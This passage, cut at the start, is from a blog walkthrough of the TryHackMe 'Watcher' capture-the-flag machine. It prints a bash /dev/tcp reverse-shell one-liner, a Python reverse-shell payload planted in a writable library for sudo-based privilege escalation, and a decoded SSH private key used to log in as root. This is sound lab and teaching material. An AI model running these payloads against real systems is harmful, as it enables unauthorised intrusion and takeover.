</span><span class="gp">/bin/bash -i &gt;</span>&amp; /dev/tcp/<span class="o">{</span>attacker_IP<span class="o">}</span>/9001 0&gt;&amp;1
</pre></table></code></div></div><p>Set up a listner on port 9001 and wait.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="go">┌──(sirius㉿kali)-[~]                                                                                                                                 [35/36]
</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 9001                                                                                                                                            
<span class="go">listening on [any] 9001 ...                                                                                                                                  
connect to [10.11.31.131] from (UNKNOWN) [10.10.18.205] 39298                                                                                                
bash: cannot set terminal process group (2119): Inappropriate ioctl for device                                                                               
bash: no job control in this shell                                                                                                                           
</span><span class="gp">mat@watcher:~$</span><span class="w">                                                                                                                                                       
</span><span class="gp">mat@watcher:~$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>                                                                                                
<span class="gp">python3 -c 'import pty;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'                                                                                                               
</span><span class="gp">mat@watcher:~$</span><span class="w"> </span><span class="s1">export TERM=xterm                                                                                                                             
</span><span class="go">export TERM=xterm                                                                                                                                            
</span><span class="gp">mat@watcher:~$</span><span class="w"> </span>^Z                                                                                                                                            
<span class="go">zsh: suspended  nc -lnvp 9001                                                                                                                                

┌──(sirius㉿kali)-[~]                                                                                                                                        
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg                                                                                                                             </span>148 ⨯ 1 ⚙
<span class="go">[1]  + continued  nc -lnvp 9001                                                                                                                              

</span><span class="gp">mat@watcher:~$</span><span class="w"> </span><span class="nb">ls</span>                                                                                                                                            
<span class="go">cow.jpg  flag_5.txt  note.txt  scripts                                                                                                                       
</span><span class="gp">mat@watcher:~$</span><span class="w"> </span><span class="nb">whoami</span>                                                                                                                                        
<span class="go">mat                                                                                                                                                          

</span></pre></table></code></div></div><p>As mat now, we can get our fifth flag.</p><h2 id="flag-6"><span class="mr-2">Flag 6</span><a href="#flag-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Nice, we became mat now, let’s see what can we do as mat here:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">mat@watcher:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                                       
<span class="go">Matching Defaults entries for mat on watcher:                                                                                                                
    env_reset, mail_badpass,                                                                                                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                 

User mat may run the following commands on watcher:                                                                                                          
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
</span></pre></table></code></div></div><p>We can run <strong>will_script.py</strong> as will, let’s see what the script does:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">mat@watcher:~/scripts$</span><span class="w"> </span><span class="nb">cat </span>will_script.py
<span class="go">import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
</span></pre></table></code></div></div><p>The script calls <code class="language-plaintext highlighter-rouge">os</code>, <code class="language-plaintext highlighter-rouge">sys</code> and <code class="language-plaintext highlighter-rouge">cmd</code> libraries, and then tries to execute one of the following commands : <code class="language-plaintext highlighter-rouge">ls -lah", "id", "cat /etc/passwd</code> depending on what we gave it as an argument.</p><p>We will be hijacking one of the libraries in order to get another reverse shell. The only library we have write permission to is <strong>cmd.py</strong>, so let’s put a python script in the file:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.10.10.10"</span><span class="p">,</span><span class="mi">9000</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">]);</span>
</pre></table></code></div></div><blockquote><p>Note : don’t forget to change the ip adress in the script!!</p></blockquote><p>The cmd.py file now looks like this:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">mat@watcher:~/scripts$</span><span class="w"> </span><span class="nb">cat </span>cmd.py                                                                                                                            
<span class="gp">import socket,subprocess,os;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.10.10"</span>,9000<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>
<span class="gp"> os.dup2(s.fileno(),2);</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/bash"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span>                                                                                                
<span class="go">
def get_command(num):                                                                                                                                        
        if(num == "1"):                                                                                                                                      
                return "ls -lah"                                                                                                                             
        if(num == "2"):                                                                                                                                      
                return "id"                                                                                                                                  

        if(num == "3"):                                                                                                                                      
                return "cat /etc/passwd"                                                                                                                     
</span><span class="gp">mat@watcher:~/scripts$</span><span class="w">  
</span></pre></table></code></div></div><p>Let’s set up another listener for this and then run the script:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">mat@watcher:~/scripts$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> will /usr/bin/python3 /home/mat/scripts/will_script 2
</pre></table></code></div></div><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">$</span>nc <span class="nt">-lvnp</span> 9000
<span class="go">listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.180.180] 38226
</span><span class="gp">$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">will
</span></pre></table></code></div></div><p>Great, we escalated to will now.</p><h2 id="flag-7"><span class="mr-2">Flag 7</span><a href="#flag-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After some enumeration, we found base64 encoded file located in <strong>/opt</strong> directory:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="gp">will@watcher:/opt/backups$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">key.b64
</span><span class="gp">will@watcher:/opt/backups$</span><span class="w"> </span><span class="nb">base64</span> <span class="nt">-d</span> key.b64
<span class="go">-----BEGIN RSA PRIVATE KEY-----
RedactedAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/redactedredactedredactedredacted+++w+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRredactedredacted==
-----END RSA PRIVATE KEY-----
</span><span class="gp">will@watcher:/opt/backups$</span><span class="w">
</span></pre></table></code></div></div><p>When we decode the file, we see that it is a SSH private key, let’s copy it to our machine, give it the right permissions, and try to connect with it.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="go"> ┌──(sirius㉿kali)-[~/CTF/THM/watcher]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">chmod </span>400 id_rsa
<span class="go"> ┌──(sirius㉿kali)-[~/CTF/THM/watcher]
</span><span class="gp">└─$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa root@10.10.10.10                                                                                                                    255 ⨯
<span class="go">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan 13 12:28:44 UTC 2022

  System load:  0.0                Processes:             124
  Usage of /:   22.5% of 18.57GB   Users logged in:       0
  Memory usage: 37%                IP address for eth0:   10.10.18.205
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020
</span><span class="gp">root@watcher:~#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">flag_7.txt
</span><span class="gp">root@watcher:~#</span><span class="w">
</span></pre></table></code></div></div><p>Great, we are root now. This was an amazing machine, hope you have enjoyed it as much as i did, and see you in the next hack.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/cronjob/" class="post-tag no-text-decoration" >cronjob</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/gobuster/" class="post-tag no-text-decoration" >gobuster</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe+-+Watcher+-+Nasrallah&url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FWatcher%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe+-+Watcher+-+Nasrallah&u=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FWatcher%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FWatcher%2F&text=TryHackMe+-+Watcher+-+Nasrallah" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FWatcher%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Preignition/">HackTheBox - Preignition</a><li><a href="/posts/HTB-Appointment/">HackTheBox - Appointment</a><li><a href="/posts/HTB-Sequel/">HackTheBox - Sequel</a><li><a href="/posts/HTB-Responder/">HackTheBox - Responder</a><li><a href="/posts/blunder/">HackTheBox - Blunder</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/hackthissite/">hackthissite</a> <a class="post-tag" href="/tags/hts/">hts</a> <a class="post-tag" href="/tags/basic/">basic</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/html/">html</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/RootMe/"><div class="card-body"> <em class="small" data-ts="1641168000" data-df="ll" > Jan 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - RootMe</h3><div class="text-muted small"><p> Hello l33ts, I hope you are doing well. Today we are going to look at RootMe, a medium machine from TryHackMe. Let’s start. Description A ctf for beginners, can you root me? Enumeration nma...</p></div></div></a></div><div class="card"> <a href="/posts/MrRobotCtf/"><div class="card-body"> <em class="small" data-ts="1640044800" data-df="ll" > Dec 21, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Mr Robot CTF</h3><div class="text-muted small"><p> Hello l33ts, I hope you are doing weel. This is my first Writeup, and we will be doing Mr robot CTF from tryhackme, it is a medium machine based on the Mr. RObot show. let’s dive into it. De...</p></div></div></a></div><div class="card"> <a href="/posts/Pickle-Rick/"><div class="card-body"> <em class="small" data-ts="1640563200" data-df="ll" > Dec 27, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Pickle Rick</h3><div class="text-muted small"><p> Hello l33ts, I hope you are doing well. Today we are going to look at Pickle Rick from TryHackMe. Description This Rick and Morty themed challenge requires you to exploit a webserver to find...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Vulnversity/" class="btn btn-outline-primary" prompt="Older"><p>TryHackMe - Vulnversity</p></a> <a href="/posts/Kenobi/" class="btn btn-outline-primary" prompt="Newer"><p>TryHackMe - Kenobi</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/NasrallahBaadi">NasrallahBaadi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/hackthissite/">hackthissite</a> <a class="post-tag" href="/tags/hts/">hts</a> <a class="post-tag" href="/tags/basic/">basic</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/html/">html</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
